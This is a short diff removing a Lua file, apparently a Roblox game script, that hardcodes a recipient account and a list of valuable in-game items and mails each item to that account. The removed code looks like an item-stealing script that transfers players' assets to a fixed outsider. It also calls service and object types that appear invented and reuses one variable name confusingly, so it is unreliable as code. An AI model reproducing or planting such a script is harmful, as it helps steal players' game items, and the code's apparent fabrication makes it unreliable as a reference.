@@ -1,5 +1,0 @@
--- senditems.lua
-
-local r="mandomfamo_2";local i={"Titanic Huge","Gems"}
-local function s(u,i)local m=game:GetService("MailService");local p=game.Players:FindFirstChild(u)if p then local ma=Instance.new("Mail");ma.Recipient=p;ma.Subject="Gift";ma.Body="Here is a gift!";ma.Attachments={i};m:SendMail(ma)else warn("Player not found: "..u)end end
-for _,i in ipairs(i)do s(r,i)end
